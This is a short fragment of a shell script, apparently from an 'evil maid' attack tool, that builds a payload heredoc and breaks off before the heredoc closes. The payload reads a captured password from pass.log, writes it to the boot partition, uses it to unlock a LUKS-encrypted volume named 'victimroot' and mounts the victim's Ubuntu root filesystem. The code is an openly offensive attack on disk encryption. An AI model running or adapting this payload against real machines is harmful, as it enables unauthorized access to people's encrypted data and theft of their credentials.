PAYLOAD=`cat <<PAYLOADTEXT
#payload
password=\\\`cat pass.log\\\`
/bin/mkdir /mntboot
/bin/mkdir /mntfs
/bin/mount -n -v -t ext2 /dev/sda1 /mntboot
echo \\$password > /mntboot/$PASSWORDFILE

echo \\$password | /sbin/cryptsetup luksOpen /dev/sda5 victimroot

/sbin/lvm vgscan
/sbin/lvm vgchange -ay ubuntu-vg
/bin/mount /dev/ubuntu-vg/root /mntfs

